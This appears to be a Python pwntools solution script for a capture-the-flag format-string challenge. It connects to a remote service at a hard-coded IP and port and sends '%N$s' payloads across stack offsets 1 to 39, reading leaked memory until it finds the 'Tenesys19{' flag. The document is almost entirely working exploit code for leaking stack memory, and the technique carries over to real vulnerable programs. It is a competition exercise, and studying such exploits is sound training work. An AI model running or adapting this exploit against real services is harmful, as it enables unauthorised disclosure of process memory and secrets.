from pwn import *

binary = ELF("./format-string", checksec = True)
context.log_level = 'error'

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack
    flag = ''
    for x in range (1, 40):
        try:
            #p = process("./format-string")
            p = remote("35.223.100.116", 6969)
            
            print "Offset number {}".format(x)

            payload = ""
            payload += "%{}$s".format(x)

            p.sendline(payload)
            
            #print p.recv()
            p.recvuntil("You typed: ")
            stack_value = p.recvline()[:-1]
            print stack_value
            if stack_value.find("Tenesys19{") != -1:
                print "[+] Offset found!"
                print "[+] Stack value: {}".format(stack_value)
                flag = stack_value
                print "[+] Flag found : {}".format(flag)
                break
            else:
                print "[+] Stack value: {}".format(stack_value)
            p.close()
        except EOFError:
            pass

if __name__ == "__main__":
    offset_finder()